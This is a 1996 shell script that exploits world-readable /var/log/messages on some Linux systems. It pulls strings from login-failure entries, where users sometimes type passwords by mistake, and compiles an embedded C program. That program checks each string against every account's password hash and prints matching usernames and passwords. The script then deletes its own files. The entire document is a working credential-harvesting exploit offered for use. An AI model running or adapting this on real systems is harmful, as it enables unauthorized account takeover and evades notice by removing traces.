#!/bin/sh

# Under a lot of linux distributions(I know Redhat 3.0.3 and Slackware 3.0)
# /var/log/messages is world readable. If a user types in his password at
# the login prompt, it may get logged to /var/log/messages.
#
# I could swear this topic has been beaten to death, but I still see this
# problem on every linux box I have access to.
#
# Dave G.
# 12/06/96
# <daveg@escape.com>
# http://www.escape.com/~daveg

echo Creating Dictionary from /var/log/messages, stored in /tmp/messages.dict.$$
grep "LOGIN FAILURE" /var/log/messages | cut -d',' -f2 | cut -c2- | sort | uniq >> /tmp/messages.dict.$$

if [ ! -e ./scrack ]
then
  echo "Creating scrack.c"
  cat << ! > scrack.c
#include <stdio.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/types.h>

#define get_salt( d, s ) strncpy( d, s, 2 )
int
main (argc,argv)
int argc;
char **argv;
{
  struct passwd *pwd;
  FILE *fp;
  char buff[80], salt[3], *encrypted_string;

  if (( fp = fopen( argv[1], "r" )) == NULL)
  {
    fprintf( stderr, "Couldnt find dict file\n" );
    exit(1);
  }

  while (fgets(buff, 80, fp) != NULL)
  {
    setpwent();
    buff[strlen(buff)-1]='\0';
				          
    while ((pwd = getpwent()) != NULL)
    {
      if (strcmp((*pwd).pw_passwd, "*") != 0 && (strlen((*pwd).pw_passwd) == 13 ))
      {
	get_salt(salt, (*pwd).pw_passwd);
	encrypted_string = (char *) (crypt(buff, salt));
	
	if (strcmp(encrypted_string, (*pwd).pw_passwd) == 0)
	{
	  fprintf( stdout, "l: %s p: %s\n", (*pwd).pw_name, buff);
	  fflush(stdout);
	}
      }
    }
  }

return 0;
}
!

echo "Creating scrack"
cc -O6 -fomit-frame-pointer -s -o scrack scrack.c -lcrypt
fi

./scrack /tmp/messages.dict.$$

echo Removing /tmp/messages.dict.$$, ./scrack.c and ./scrack.
rm /tmp/messages.dict.$$
rm ./scrack.c
rm ./scrack
